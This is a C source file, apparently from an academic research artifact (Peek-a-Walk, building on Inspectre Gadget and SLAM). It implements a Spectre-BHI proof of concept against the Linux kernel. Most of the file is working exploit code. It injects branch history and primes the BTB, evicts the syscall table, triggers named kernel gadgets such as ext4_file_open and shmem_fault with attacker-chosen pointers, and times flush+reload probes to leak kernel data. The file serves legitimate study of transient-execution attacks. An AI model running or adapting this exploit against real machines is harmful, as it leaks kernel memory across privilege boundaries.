/*
 *  Code credits to the Inspectre Gadget paper for the majority of the code here (for BHI) [1].
 *  Parts of the unmasked gadget code is taken from the SLAM paper [2]. 
 *  This code is also eidted to have the PWSC functionality we need. Code marked with PWSC
 *  is added by our work, Peek-a-Walk. 
 *  - Alan :) 
 * 
 *  [1] Inspectre Gadget by Weibing et al. https://github.com/vusec/inspectre-gadget 
 *  [2] SLAM by Hertogh et al. https://github.com/vusec/slam 
 */

#include <unistd.h>
#include <string.h>
#include <sys/syscall.h>


#include "flush_and_reload.h"
#include "targets.h"
#include "poc-common/common.h"

#include "util.h"



#include "poc-common/l2_eviction/evict_sys_table_l2.h"

extern void fill_bhb(uint8_t *history, uint64_t syscall_nr,
                     uint64_t arg1, uint64_t arg2, uint64_t arg3, uint64_t arg4);

extern uint64_t static_fill_bhb_sys(uint64_t syscall_nr,
                     uint64_t arg1, uint64_t arg2, uint64_t arg3, uint64_t arg4);

/* Global Vars */ 
char seqfile_buf[32];
int fd = -1; 
uint8_t * history = NULL; 
uint8_t * map = NULL;  

// This is taken form SLAM and is used to trigger unmasked gadgets in the kernel 
static void bhi_trigger_victim_syscall(char *secret_ptr) {
#ifdef CGROUP_SEQFILE_SHOW
	/* <cgroup_seqfile_show>:
	 *   mov    rax, QWORD PTR [rdi+0x70]
	 *   mov    rdx, QWORD PTR [rax]
	 *   mov    rax, intel_lam_mask(rdx)
	 *   mov    r14, QWORD PTR [rax+0x60]
	 */
	fill_bhb(history, VICTIM_SYSCALL, (uint64_t)secret_ptr, 0, 0, 0);
#endif
#ifdef EXT4_FILE_OPEN
	/* <ext4_file_open>:
	 *   mov    r14, QWORD PTR [rdi+0x28]
	 *   mov    rbx, QWORD PTR [r14+0x398]
	 *   mov    rax, intel_lam_mask(rbx)
	 *   mov    rax, QWORD PTR [rax+0x230]
	 */
	asm volatile ("mov %0, %%rbx\n" : : "r"((uint64_t)secret_ptr - 0x398) : "%rbx");
	fill_bhb(history, VICTIM_SYSCALL, 0, 0, 0, 0);
#endif
#ifdef EXT4_FILE_WRITE_ITER
	/* <ext4_file_write_iter>:
	 *   mov    rax, QWORD PTR [rdi]
	 *   mov    rcx, QWORD PTR [rax+0x20]
	 *   mov    rax, intel_lam_mask(rcx)
	 *   mov    rdx, QWORD PTR [rax+0x28]
	 */
	asm volatile ("mov %0, %%r15\n" : : "r"((uint64_t)secret_ptr - 0x20) : "%r15");
	fill_bhb(history, VICTIM_SYSCALL, 0, 0, 0, 0);
#endif
#ifdef HUGETLBFS_READ_ITER
	/* <hugetlbfs_read_iter>:
	 *   mov    rcx, QWORD PTR [rdi]
	 *   mov    rdx, QWORD PTR [rcx+0x20]
	 *   mov    rax, intel_lam_mask(rdx)
	 *   mov    rax, QWORD PTR [rax+0x28]
	 */
	asm volatile ("mov %0, %%r15\n" : : "r"((uint64_t)secret_ptr - 0x20) : "%r15");
	fill_bhb(history, VICTIM_SYSCALL, 0, 0, 0, 0);
#endif
#ifdef KERNFS_FOP_READ_ITER
	/* <kernfs_fop_read_iter>:
	 *   mov    rax, QWORD PTR [rdi]
	 *   mov    rcx, QWORD PTR [rax+0xc8]
	 *   mov    rax, intel_lam_mask(rcx)
	 *   mov    rax, QWORD PTR [rax+0x70]
	 */
	asm volatile ("mov %0, %%r15\n" : : "r"((uint64_t)secret_ptr - 0xc8) : "%r15");
	fill_bhb(history, VICTIM_SYSCALL, 0, 0, 0, 0);
#endif
#ifdef KERNFS_SEQ_SHOW
	/* <kernfs_seq_show>:
	 *   mov    r8,  QWORD PTR [rdi+0x70]
	 *   mov    rdx, QWORD PTR [r8]
	 *   mov    rax, intel_lam_mask(rdx)
	 *   mov    rax, QWORD PTR [rax+0x48]
	 */
	fill_bhb(history, VICTIM_SYSCALL, (uint64_t)secret_ptr, 0, 0, 0);
#endif
#ifdef PROC_SIGNLE_SHOW
	/* <proc_single_show>:
	 *   mov    rbx, QWORD PTR [rdi+0x70]
	 *   mov    rdx, QWORD PTR [rbx+0x28]
	 *   mov    rax, intel_lam_mask(rdx)
	 *   mov    rax, QWORD PTR [rax+0x398]
	 */
	fill_bhb(history, VICTIM_SYSCALL, (uint64_t)secret_ptr - 0x28, 0, 0, 0);
#endif
#ifdef RAW_SEQ_START
	/* <raw_seq_start>:
	 *   mov    rax, QWORD PTR [rdi+0x68]
	 *   mov    rdx, QWORD PTR [rax+0x20]
	 *   mov    rax, intel_lam_mask(rdx)
	 *   mov    rdi, QWORD PTR [rax+0x270]
	 */
	fill_bhb(history, VICTIM_SYSCALL, 0, (uint64_t)secret_ptr - 0x20, 0, 0);
#endif
#ifdef SEL_READ_MLS
	/* <sel_read_mls>:
	 *   mov    rax, QWORD PTR [rdi+0x20]
	 *   mov    rdx, QWORD PTR [rax+0x28]
	 *   mov    rax, intel_lam_mask(rdx)
	 *   mov    rax, QWORD PTR [rax+0x398]
	 */
	uint64_t rbp;
	asm volatile ("mov %%rbp, %0\n" : "=m"(rbp));
	asm volatile ("mov %0, %%rbp\n" : : "r"((uint64_t)secret_ptr - 0x28));
	fill_bhb(history, VICTIM_SYSCALL, 0, 0, 0, 0);
	asm volatile ("mov %0, %%rbp\n" : : "m"(rbp));
#endif
#ifdef SHMEM_FAULT
	/* <shmem_fault>:
	 *   mov    r9,  QWORD PTR [rdi]
	 *   mov    rdx, QWORD PTR [r9+0x70]
	 *   mov    rax, intel_lam_mask(rdx)
	 *   mov    r12, QWORD PTR [rax+0x20]
	 */
	asm volatile ("mov %0, %%r15\n" : : "r"((uint64_t)secret_ptr - 0x70) : "%r15");
	fill_bhb(history, VICTIM_SYSCALL, 0, 0, 0, 0);
#endif
#ifdef SHMEM_STATFS
	/* <shmem_statfs>:
	 *   mov    rax, QWORD PTR [rdi+0x68]
	 *   mov    rax, QWORD PTR [rax+0x398]
	 *   mov    r12, intel_lam_mask(rax)
	 *   mov    r14, QWORD PTR [r12]
	 */
	fill_bhb(history, VICTIM_SYSCALL, 0, (uint64_t)secret_ptr - 0x398, 0, 0);
#endif
}


// This is taken form SLAM and is used to prime the BTB for each unmasked gadget 
static void prime_btb(int gadget_fd)
{
	// Dump sytem call data here and ignore it.
	char buf[32];

#ifdef EXT4_FILE_OPEN
	int fd = static_fill_bhb_sys(SYS_open, (uint64_t)"gadget.txt", O_CREAT, S_IRUSR|S_IWUSR, 0);
	if (close(fd) < 0)
		fail("failed closing gadget.txt's fd");
	fd = static_fill_bhb_sys(SYS_open, (uint64_t)"gadget.txt", O_CREAT, S_IRUSR|S_IWUSR, 0);
	if (close(fd) < 0)
		fail("failed closing gadget.txt's fd");
#endif
#ifdef EXT4_FILE_WRITE_ITER
	static_fill_bhb_sys(SYS_pwrite64, gadget_fd, (uint64_t)buf, 32, 0);
	static_fill_bhb_sys(SYS_pwrite64, gadget_fd, (uint64_t)buf, 32, 0);
#endif
#if (defined CGROUP_SEQFILE_SHOW || defined HUGETLBFS_READ_ITER || defined KERNFS_SEQ_SHOW || defined KERNFS_FOP_READ_ITER \
		|| defined PROC_SIGNLE_SHOW || defined RAW_SEQ_START || defined SEL_READ_MLS)
	static_fill_bhb_sys(SYS_pread64, gadget_fd, (uint64_t)buf, 32, 0);
	static_fill_bhb_sys(SYS_pread64, gadget_fd, (uint64_t)buf, 32, 0);
#endif
#ifdef SHMEM_FAULT
	void *p = mmap(NULL, PAGE_SIZE, PROT_RW, MAP_SHARED|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
	munmap(p, PAGE_SIZE);
	p = mmap(NULL, PAGE_SIZE, PROT_RW, MAP_SHARED|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
	munmap(p, PAGE_SIZE);
#endif
#ifdef SHMEM_STATFS
	struct statfs r;
	statfs("/dev/shm", &r);
	statfs("/dev/shm", &r);
#endif
}


// ----------------------------------------------------------------------------
// PWSC leakage functions
//
// ----------------------------------------------------------------------------
void set_pwsc_load_chain(struct config * cfg, uint64_t target) { // for PWSC spectre-BHI testing 

    // ------------------------------------------------------------------------
    //  Use one indirect load before touching reload buffer
    //  mov    rax,QWORD PTR [rdi+0x70]   ;rax=ATTACKER RDI
    //  mov    r8,rsi
    //  mov    rbp,rdi
    //  mov    rax,QWORD PTR [rax]        ;rax=ind_map_kern
    //  mov    rsi,QWORD PTR [rax+0x60]   ;rsi=fr_buf_kern - 0x58
    //  mov    rdx,QWORD PTR [rax+0x8]    ;unused
    //  mov    rax,QWORD PTR [rsi+0x58]   ;load reload buffer
    memset(cfg->ind_map, 0, 0x100);
    *(uint64_t *)(cfg->ind_map) = target - 0x60; 
}

void setup_for_pwsc(struct config *cfg) {
    history = cfg->history; 
    fd = cfg->fd; 
    map = cfg->ind_map; 
    assert(fd != -1); 
    assert(history != NULL);
}

// The following 3 functions are used by the PWSC library to for leakage in the SpectreV2 (BHI) setting
uint64_t setup_trigger_bhi(uint64_t target, uint64_t phase, uint64_t __trash) {
    // Ensure target is in the BTB
    for(int i = 0; i < 5; i++) {
        prime_btb(fd); 
        evict_sys_call_table();
        asm volatile("mfence\n");
        asm volatile("prefetcht0 (%0)" :: "r" (target));
        asm volatile("mfence\n");
        cpuid(); 
        bhi_trigger_victim_syscall((char *)target);
    }
    return __trash;
}

uint64_t pre_pp_setup(uint64_t target, uint64_t phase, uint64_t __trash) {
    prime_btb(fd);
    evict_sys_call_table();
    asm volatile("mfence\n");
    return __trash;
}

uint64_t trigger_bhi(uint64_t target, uint64_t phase, uint64_t __trash) { 
    asm volatile("prefetcht0 (%0)" :: "r" (target));
    asm volatile("mfence\n"); // ensure low noise 
    cpuid(); 
    bhi_trigger_victim_syscall((char*)((phase * target) | ((!phase) * (0xf000000000000000)))); 
    return __trash;
}


/*
    BHB collsion function 
*/
uint64_t do_flush_and_reload(struct config * cfg, uint64_t iterations, uint8_t ret_on_hit) {

    uint64_t hits = 0;
    *(volatile uint64_t *)cfg->ind_map;
    *(volatile uint64_t *)(cfg->ind_map + 64);

    for(int i=0; i<iterations; i++) {
        asm volatile("clflush (%0)\n"::"r"(cfg->reload_addr));
        asm volatile("prefetcht0 (%0)" :: "r" (cfg->ind_map_kern));
        asm volatile("sfence\n");
        prime_btb(cfg->fd); 
        cpuid();
        evict_sys_call_table();
        bhi_trigger_victim_syscall((char*)cfg->fr_buf_kern); 
        cpuid();
        if(load_time(cfg->reload_addr) < THR) {
            if (ret_on_hit) {
                return 1;
            } else {
                hits++;
            }
        }
    }

    return hits;
}
